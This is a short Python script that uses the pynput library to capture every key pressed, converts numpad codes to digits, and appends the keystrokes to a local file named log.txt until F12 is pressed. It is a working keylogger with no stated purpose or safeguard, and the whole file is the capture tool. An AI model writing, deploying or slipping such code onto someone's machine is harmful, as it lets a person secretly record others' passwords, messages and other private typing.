from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.space":
        key = "..."
    if key == "Key.enter":
        key = "\n"
    if key == "Key.ctrl_l":
        key = "\n"
    if key == "<96>":
        key = "0"
    if key == "<97>":
        key = "1"
    if key == "<98>":
        key = "2"
    if key == "<99>":
        key = "3"
    if key == "<100>":
        key = "4"
    if key == "<101>":
        key = "5"
    if key == "<102>":
        key = "6"
    if key == "<103>":
        key = "7"
    if key == "<104>":
        key = "8"
    if key == "<105>":
        key = "9"
    with open("log.txt", "a") as file:
        file.write(key)
        print(key)

with Listener(on_press=anonymous) as listener:
    listener.join()
